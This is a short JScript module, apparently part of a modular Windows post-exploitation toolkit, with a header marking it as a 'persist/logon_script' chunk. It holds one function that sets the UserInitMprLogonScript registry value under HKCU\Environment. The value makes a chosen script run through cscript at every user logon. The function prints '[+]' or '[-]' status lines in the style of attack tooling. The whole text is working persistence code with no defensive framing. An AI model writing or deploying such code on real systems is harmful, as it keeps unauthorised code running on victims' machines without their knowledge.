// chunk: persist/logon_script
// depends: core/run_cmd, core/file_ops
// provides: persist_logon
// format: jscript

function persist_logon(scriptPath) {
    var envDir = _s.ExpandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows\\Netlogon";
    try {
        if (!_fso.FolderExists(envDir)) _fso.CreateFolder(envDir);
    } catch(e) {}
    var r = _run("reg add \"HKCU\\Environment\" /v UserInitMprLogonScript /d \"cscript //nologo //E:jscript \\\"" + scriptPath + "\\\"\" /f 2>NUL");
    if (r.indexOf("successfully") >= 0) {
        emit("  [+] Logon script persistence via UserInitMprLogonScript\r\n");
    } else {
        emit("  [-] Logon script persistence failed\r\n");
    }
}
